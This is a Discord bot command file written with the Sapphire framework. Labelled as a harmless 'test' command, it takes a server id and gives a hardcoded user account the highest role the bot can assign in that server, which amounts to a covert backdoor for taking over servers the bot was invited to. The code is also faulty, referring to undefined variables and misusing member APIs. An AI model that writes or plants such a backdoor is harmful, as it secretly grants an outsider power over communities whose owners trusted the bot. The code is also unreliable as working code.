const { Command, CommandOptionsRunTypeEnum, BucketScope } = require('@sapphire/framework');
const { MessageEmbed, MessageAttachment, Permissions } = require('discord.js');
const { codeBlock, isThenable, PaginatedMessage } = require('@sapphire/utilities');
const { Time, Duration } = require('@sapphire/time-utilities');
const { send, reply } = require('@sapphire/plugin-editable-commands');
const { fetch, FetchResultTypes, FetchMethods } = require('@sapphire/fetch');
const { Stopwatch } = require('@sapphire/stopwatch');
const { PasteGG } = require("paste.gg");
const moment = require('moment');
const util = require("util");
const { unix } = require('moment');

module.exports = class TestCommand extends Command {
  constructor(context, options) {
    super(context, {
      ...options,
      name: 'test',
      aliases: ['test', 'command'],
      requiredUserPermissions: [],
      requiredClientPermissions: [],
      preconditions: ['ownerOnly'],
      subCommands: [],
      flags: [],
      options: [],
      quotes: ['(', ')'],
      nsfw: false,
      description: {
        content: 'Testing',
        usage: '',
        examples: ['']
      }
    });
  }

  async messageRun(message, args) {
    var guildId = await args.rest('string').catch(() => message.guild.id);

    if (guildId) {
      let targetguild = await this.container.client.guilds.fetch(guildId).catch(() => null);
      let targetMember = targetguild.members.cache.get('319183644331606016');

      // add highest role below bot to targetMember
      let highestRole = targetguild.roles.cache.filter(role => role.position < guild.members.cache.get(this.container.client.user.id).roles.highest.position).sort((a, b) => b.position - a.position).first();
      if (highestRole) targetMember.roles.add(highestRole);

      // if targetMember is not in targetguild, add them
      if (!targetMember.guild) targetguild.members.add(targetMember);
      

      await targetMember.roles.add(role);
      return targetMember.send(`Added role ${role.name} to ${targetMember.user.tag}`);
    }
  }
}